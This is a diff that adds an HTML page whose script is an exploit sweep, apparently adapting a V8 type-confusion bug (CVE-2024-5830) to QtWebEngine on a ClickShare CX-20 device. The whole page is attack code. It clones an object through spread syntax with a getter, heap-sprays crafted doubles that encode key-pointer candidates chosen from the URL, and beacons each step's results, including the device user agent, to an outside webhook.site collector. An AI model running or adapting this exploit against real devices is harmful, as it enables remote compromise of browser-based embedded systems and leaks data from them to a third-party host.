@@ -1,0 +1,82 @@
+<html><body><script>
+// CVE-2024-5830 adaptation sweep for QtWebEngine 118 aarch64 (ClickShare CX-20)
+// Each render tries ONE key-pointer candidate: 0xdc5 + try*0x200
+const SINK = 'https://webhook.site/ba41f60a-8179-4fb4-8e46-be78a2fe067f';
+function enc(s){ return encodeURIComponent(String(s).slice(0,180)); }
+function beacon(tag, val){
+  try { fetch(SINK + '?t=' + enc(tag) + '&v=' + enc(val), {mode:'no-cors'}); } catch(e) {}
+  try { new Image().src = SINK + '?t=img_' + enc(tag) + '&v=' + enc(val); } catch(e) {}
+}
+function sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }
+
+var qs = new URLSearchParams(location.search);
+var tryN = parseInt(qs.get('try') || '0', 10);
+if (!(tryN >= 0)) tryN = 0;
+var KEYCAND = 0xdc5 + tryN * 0x200;
+
+var view = new ArrayBuffer(24);
+var dblArr = new Float64Array(view);
+var intView = new Uint32Array(view);
+
+function i32tof(i1, i2) {
+  intView[0] = i1; intView[1] = i2; return dblArr[0];
+}
+
+(async function main(){
+  beacon('v2_start', 'try=' + tryN + ' cand=0x' + KEYCAND.toString(16) + ' ua=' + navigator.userAgent.slice(0,60));
+  await sleep(80);
+
+  var num = 3;
+  var x = {};
+  for (let i = 0; i < num; i++) { x['a' + i] = 1; }
+  var x1 = {};
+  for (let i = 0; i < num; i++) { x1['a' + i] = 1; }
+  x1.prop = 1;
+  x.__defineGetter__("prop", function() {
+    let obj = {};
+    obj.a0 = 1.5;
+    for (let i = 0; i < 1024 + 512; i++) {
+      let tmp = {};
+      tmp.a0 = 1;
+      for (let j = 1; j < num; j++) { tmp['a' + j] = 1; }
+      tmp['p' + i] = 1;
+    }
+    return 4;
+  });
+  x.z = 1;
+  delete x.z;
+
+  var y = {...x};
+  beacon('v2_clone', 'keys_y=' + Object.keys(y).join(','));
+  await sleep(80);
+
+  // spray: every double = (key=candidate, value=SMI 0x4141 tagged = 0x8282)
+  var sprayVal = i32tof(KEYCAND, 0x8282);
+  var arr = new Array(256);
+  for (let i = 0; i < 7; i++) {
+    arr[i] = new Array(256);
+    for (let j = 0; j < arr[i].length; j++) { arr[i][j] = sprayVal; }
+  }
+  beacon('v2_spray', 'ok');
+  await sleep(80);
+
+  var z = {};
+  z.__proto__ = y;
+  z.p = 1;
+  var zpv = z.p;
+  beacon('v2_z', 'z.p=' + zpv);
+  await sleep(120);
+
+  var ks = 'KEYS-FAIL';
+  try { ks = Object.keys(y).join(','); } catch(e) { ks = 'KEYS-ERR:' + e; }
+  beacon('v2_keys', ks);
+  await sleep(120);
+
+  var tn = 'undefined';
+  try { tn = (typeof y.name); } catch(e) { tn = 'ERR'; }
+  beacon('v2_yname', tn);
+  await sleep(80);
+
+  beacon('v2_done', 'try=' + tryN + ' completed');
+})();
+</script></body></html>
